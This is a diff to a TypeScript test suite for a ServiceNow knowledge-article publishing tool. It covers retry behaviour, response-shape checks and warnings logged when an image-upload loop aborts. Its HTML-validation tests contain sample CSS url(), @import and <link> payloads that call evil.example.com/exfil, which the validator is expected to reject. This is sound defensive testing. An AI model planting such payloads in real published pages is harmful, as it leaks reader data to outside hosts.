@@ -31,10 +31,12 @@ const HEADERS = {
 };
 
 // ---------------------------------------------------------------------------
-// Spy helpers for tasks.setSecret
+// Spy helpers for tasks.setSecret / tasks.warning
 // ---------------------------------------------------------------------------
 const capturedSecrets: string[] = [];
+const capturedWarnings: string[] = [];
 let origSetSecret: typeof tasks.setSecret;
+let origWarning: typeof tasks.warning;
 
 before(() => {
     origSetSecret = tasks.setSecret;
@@ -43,17 +45,23 @@ before(() => {
     (tasks as Record<string, unknown>)['setSecret'] = (val: string) => {
         capturedSecrets.push(val);
     };
+    origWarning = tasks.warning;
+    (tasks as Record<string, unknown>)['warning'] = (message: string) => {
+        capturedWarnings.push(message);
+    };
     // Prevent nock from allowing unmocked requests to escape to the network.
     nock.disableNetConnect();
 });
 
 after(() => {
     tasks.setSecret = origSetSecret;
+    (tasks as Record<string, unknown>)['warning'] = origWarning;
     nock.enableNetConnect();
 });
 
 afterEach(() => {
     capturedSecrets.length = 0;
+    capturedWarnings.length = 0;
     nock.cleanAll();
 });
 
@@ -344,6 +352,18 @@ describe('client.getArticle', () => {
             /no article object in "result"|ArticleNotObject/,
         );
     });
+
+    it('#506: retries a transient 503 on the read-only GET, then succeeds', async () => {
+        const article = { sys_id: 'art_retry', number: 'KB0098', short_description: 'T', workflow_state: 'draft' };
+        nock(BASE_URL)
+            .get('/api/now/table/kb_knowledge/art_retry')
+            .reply(503, { error: 'busy' })
+            .get('/api/now/table/kb_knowledge/art_retry')
+            .reply(200, { result: article });
+
+        const found = await client.getArticle(INSTANCE, HEADERS, 'art_retry');
+        assert.strictEqual(found.sys_id, 'art_retry');
+    });
 });
 
 describe('client.updateKnowledgeArticle', () => {
@@ -588,6 +608,77 @@ describe('client.findOrCreateCategory', () => {
             .reply(200, { result: [] });
 
         const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'Ghost', undefined, false);
+        assert.strictEqual(id, null);
+    });
+
+    it('#506: retries a transient 503 on the get-or-create createCategory POST, then succeeds', async () => {
+        nock(BASE_URL)
+            .get('/api/now/table/kb_category')
+            .query(true)
+            .reply(200, { result: [] });
+
+        nock(BASE_URL)
+            .post('/api/now/table/kb_category')
+            .reply(503, { error: 'busy' })
+            .post('/api/now/table/kb_category')
+            .reply(201, { result: { sys_id: 'retried_cat_id', label: 'RetriedCategory' } });
+
+        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'RetriedCategory');
+        assert.strictEqual(id, 'retried_cat_id');
+    });
+
+    // -----------------------------------------------------------------------
+    // #524: createCategory response-shape guard
+    // -----------------------------------------------------------------------
+
+    it('#524: throws a clear diagnostic when the create response "result" is an array, not an object', async () => {
+        nock(BASE_URL)
+            .get('/api/now/table/kb_category')
+            .query(true)
+            .reply(200, { result: [] });
+
+        nock(BASE_URL)
+            .post('/api/now/table/kb_category')
+            .reply(201, { result: [{ sys_id: 'unexpected_array_shape' }] });
+
+        await assert.rejects(
+            () => client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'ArrayShape'),
+            /no category object in "result"|CategoryNotObject/,
+        );
+    });
+
+    it('#524: throws a clear diagnostic when the create response "result" is a string, not an object', async () => {
+        nock(BASE_URL)
+            .get('/api/now/table/kb_category')
+            .query(true)
+            .reply(200, { result: [] });
+
+        nock(BASE_URL)
+            .post('/api/now/table/kb_category')
+            .reply(201, { result: 'not an object' });
+
+        await assert.rejects(
+            () => client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'StringShape'),
+            /no category object in "result"|CategoryNotObject/,
+        );
+    });
+
+    it('#524: preserves the get-or-create fallback contract -- a valid-object-but-no-sys_id "result" (e.g. a nested error body) does not throw, returns null', async () => {
+        // Mirrors assertArticleResult's own shallow shape check: a plain object
+        // that isn't the expected record shape (here, a ServiceNow error body
+        // returned with a 2xx status) is not itself invalid JSON structure, so it
+        // must fall through to resolveKbCategory's existing "no category" fallback
+        // rather than failing the whole publish.
+        nock(BASE_URL)
+            .get('/api/now/table/kb_category')
+            .query(true)
+            .reply(200, { result: [] });
+
+        nock(BASE_URL)
+            .post('/api/now/table/kb_category')
+            .reply(200, { result: { error: { message: 'no view for kb_category' }, status: 'failure' } });
+
+        const id = await client.findOrCreateCategory(INSTANCE, HEADERS, 'kb123', 'NestedErrorShape');
         assert.strictEqual(id, null);
     });
 
@@ -914,6 +1005,65 @@ describe('htmlValidate.validateHtmlContent', () => {
         const badHtml = `<!DOCTYPE html PUBLIC "${'x'.repeat(3000)}"><html><body><p>hi</p></body></html>`;
         assert.doesNotThrow(() => htmlValidate.validateHtmlContent(badHtml, true));
     });
+
+    // -----------------------------------------------------------------------
+    // #523: <style>/<link> handling
+    // -----------------------------------------------------------------------
+
+    it('does not throw on the trusted Markdown2Html document wrapper\'s <style> (no url(...)/@import) (#523)', () => {
+        // Markdown2Html's generateHtmlDocument() unconditionally injects its own
+        // <head><style>...</style></head> into every document it produces, and the
+        // documented Markdown2Html -> PublishKbArticle pipeline feeds that whole
+        // generated document into this task's htmlFile input verbatim. ServiceNow
+        // is verified to preserve and render that block, so this gate must not
+        // reject its own upstream task's legitimate output.
+        const html = '<html><head><style>body{color:#333;padding:20px}pre{background-color:#f6f8fa}</style></head><body><p>hi</p></body></html>';
+        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
+    });
+
+    it('throws on <style> content containing url(...) regardless of location, incl. inside <head> (#523)', () => {
+        // A structural "reject <style> outside <head>" check would be trivially
+        // defeated by an attacker who simply wraps a hostile <style> in its own
+        // <head> -- the check must key on the CSS content, not the element's
+        // position in the document, to withstand a deliberate raw-htmlFile bypass.
+        const html = '<html><head><style>body{background:url(https://evil.example.com/exfil?x=1)}</style></head><body><p>hi</p></body></html>';
+        assert.throws(
+            () => htmlValidate.validateHtmlContent(html, false),
+            /url\(\.\.\.\).*not allowed|DangerousStyleContentNotAllowed/,
+        );
+    });
+
+    it('throws on a bare <style> containing @import with no surrounding <head>/<body> structure (#523)', () => {
+        const html = '<style>@import url(https://evil.example.com/exfil.css);</style><p>hi</p>';
+        assert.throws(
+            () => htmlValidate.validateHtmlContent(html, false),
+            /url\(\.\.\.\).*not allowed|DangerousStyleContentNotAllowed/,
+        );
+    });
+
+    it('throws on dangerous <style> content even when force=true (#523: not a force-bypassable heuristic)', () => {
+        const html = '<html><head><style>body{background:url(https://evil.example.com/exfil)}</style></head><body><p>hi</p></body></html>';
+        assert.throws(
+            () => htmlValidate.validateHtmlContent(html, true),
+            /url\(\.\.\.\).*not allowed|DangerousStyleContentNotAllowed/,
+        );
+    });
+
+    it('throws on a <link rel="stylesheet"> via the shared DANGEROUS_TAGS gate (#523)', () => {
+        const html = '<html><head><link rel="stylesheet" href="https://evil.example.com/exfil.css"></head><body><p>hi</p></body></html>';
+        assert.throws(
+            () => htmlValidate.validateHtmlContent(html, false),
+            /<iframe>\/<object>\/<embed>\/<noscript>\/<link>|FormOrSvgAnimationNotAllowed/,
+        );
+    });
+
+    it('throws on a <link> even when force=true (#523: force never bypasses XSS/injection checks)', () => {
+        const html = '<html><head><link rel="stylesheet" href="https://evil.example.com/exfil.css"></head><body><p>hi</p></body></html>';
+        assert.throws(
+            () => htmlValidate.validateHtmlContent(html, true),
+            /<iframe>\/<object>\/<embed>\/<noscript>\/<link>|FormOrSvgAnimationNotAllowed/,
+        );
+    });
 });
 
 // ===========================================================================
@@ -1219,6 +1369,71 @@ describe('processArticleImages', () => {
         );
         assert.strictEqual(result.uploaded, 0);
         assert.strictEqual(result.html, html);
+    });
+
+    // -----------------------------------------------------------------------
+    // #509: mid-loop abort logging + retry
+    // -----------------------------------------------------------------------
+
+    it('#509: logs (tasks.warning) which attachments were already uploaded when a later image aborts the loop', async () => {
+        fs.writeFileSync(nodePath.join(baseDir, 'images', 'first.png'), Buffer.from('IMG-FIRST'));
+        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, { result: [] });
+        nock(BASE_URL)
+            .post('/api/now/attachment/file')
+            .query(true)
+            .reply(201, { result: { sys_id: 'att_first' } });
+
+        const html = '<p><img src="./images/first.png"><img src="./images/missing.png"></p>';
+        await assert.rejects(
+            () => processArticleImages(INSTANCE, HEADERS, 'art1', html, baseDir, /* failOnMissing */ true, () => { }),
+            /Image not found|ImageNotFound/,
+        );
+
+        assert.strictEqual(capturedWarnings.length, 1, `expected exactly one abort warning: ${capturedWarnings}`);
+        assert.ok(
+            capturedWarnings[0].includes('first.png'),
+            `warning should name the already-uploaded attachment: ${capturedWarnings[0]}`,
+        );
+    });
+
+    it('#509: does not log an abort warning when the loop completes without aborting', async () => {
+        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, { result: [] });
+        nock(BASE_URL)
+            .post('/api/now/attachment/file')
+            .query(true)
+            .reply(201, { result: { sys_id: 'att_ok' } });
+
+        const html = '<p><img src="./images/d.png"></p>';
+        const result = await processArticleImages(INSTANCE, HEADERS, 'art1', html, baseDir, false, () => { });
+
+        assert.strictEqual(result.uploaded, 1);
+        assert.strictEqual(capturedWarnings.length, 0, `expected no abort warning on success: ${capturedWarnings}`);
+    });
+
+    it('#509: retries a transient failure on the delete step of a hash-mismatch replace', async () => {
+        // deleteAttachment (unlike uploadAttachment) previously had no retry of
+        // its own -- syncImageAttachment now wraps that specific call in
+        // withRetry too, giving the delete step the same transient-failure
+        // resilience as the upload step, without re-running the (already
+        // succeeded) upload on a delete retry.
+        nock(BASE_URL).get('/api/now/attachment').query(true).reply(200, {
+            result: [{ sys_id: 'old_att', file_name: 'd.png', hash: 'DIFFERENT-HASH' }],
+        });
+        nock(BASE_URL)
+            .post('/api/now/attachment/file')
+            .query(true)
+            .reply(201, { result: { sys_id: 'att_replaced' } });
+        nock(BASE_URL)
+            .delete('/api/now/attachment/old_att')
+            .reply(503, { error: 'busy' });
+        nock(BASE_URL)
+            .delete('/api/now/attachment/old_att')
+            .reply(204);
+
+        const html = '<p><img src="./images/d.png"></p>';
+        const result = await processArticleImages(INSTANCE, HEADERS, 'art1', html, baseDir, false, () => { });
+        assert.strictEqual(result.uploaded, 1);
+        assert.ok(result.html.includes('att_replaced'));
     });
 });
 
